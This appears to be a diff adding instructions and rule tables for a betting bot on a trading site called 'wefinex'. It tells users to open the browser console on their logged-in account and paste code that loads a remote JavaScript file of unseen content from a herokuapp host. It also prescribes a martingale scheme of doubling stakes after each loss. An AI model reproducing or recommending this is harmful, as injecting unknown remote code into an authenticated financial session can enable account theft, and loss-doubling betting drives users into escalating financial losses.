@@ -1,0 +1,95 @@
+FLow rule
+
+var listRule = [
+    "xdxdxdxdxx->x",
+    "xdxdxdddxx->x",
+    "xdxdxdxddx->x",
+    "xdxdxddddx->x",
+    "xdxdddxdxx->x",
+    "xdxdddddxx->x",
+    "xdxdddxddx->x",
+    "xdxddddddx->x",
+    "xdddxdxdxx->x",
+    "xdddxdddxx->x",
+    "xdddxdxddx->x",
+    "xdddxddddx->x",
+    "xdddddxdxx->x",
+    "xdddddddxx->x",
+    "xdddddxddx->x",
+    "xddddddddx->x",
+    "ddxdxdxdxx->x",
+    "ddxdxdddxx->x",
+    "ddxdxdxddx->x",
+    "ddxdxddddx->x",
+    "ddxdddxdxx->x",
+    "ddxdddddxx->x",
+    "ddxdddxddx->x",
+    "ddxddddddx->x",
+    "ddddxdxdxx->x",
+    "ddddxdddxx->x",
+    "ddddxdxddx->x",
+    "ddddxddddx->x",
+    "ddddddxdxx->x",
+    "ddddddddxx->x",
+    "ddddddxddx->x",
+    "dddddddddx->x",
+    "xxxxxxdxdd->d",
+    "xxxxxxxxdd->d",
+    "xxxxxxdxxd->d",
+    "xxxxxxxxxd->d",
+    "xxxxdxdxdd->d",
+    "xxxxdxxxdd->d",
+    "xxxxdxdxxd->d",
+    "xxxxdxxxxd->d",
+    "xxdxxxdxdd->d",
+    "xxdxxxxxdd->d",
+    "xxdxxxdxxd->d",
+    "xxdxxxxxxd->d",
+    "xxdxdxdxdd->d",
+    "xxdxdxxxdd->d",
+    "xxdxdxdxxd->d",
+    "xxdxdxxxxd->d",
+    "dxxxxxdxdd->d",
+    "dxxxxxxxdd->d",
+    "dxxxxxdxxd->d",
+    "dxxxxxxxxd->d",
+    "dxxxdxdxdd->d",
+    "dxxxdxxxdd->d",
+    "dxxxdxdxxd->d",
+    "dxxxdxxxxd->d",
+    "dxdxxxdxdd->d",
+    "dxdxxxxxdd->d",
+    "dxdxxxdxxd->d",
+    "dxdxxxxxxd->d",
+    "dxdxdxdxdd->d",
+    "dxdxdxxxdd->d",
+    "dxdxdxdxxd->d",
+    "dxdxdxxxxd->d"
+];
+var lostValueSet = {
+    0: 1,
+    1: 2,
+    2: 4,
+    3: 8,
+    4: 16,
+    5: 32,
+    6: 64
+};
+
+
+
+Open web
+Goto wefinex
+F12/Right Click ->Inspect
+Pase here to console
+
+
+3s cuoi danh
+//check lost more > 3
+
+Remember last choose and "gap thep" if lost money
+
+var fileref=document.createElement('script')
+fileref.setAttribute("type","text/javascript")
+fileref.setAttribute("src", "https://tranquil-fjord-14350.herokuapp.com/release/v8-3/release.js")
+document.getElementsByTagName("head")[0].appendChild(fileref)
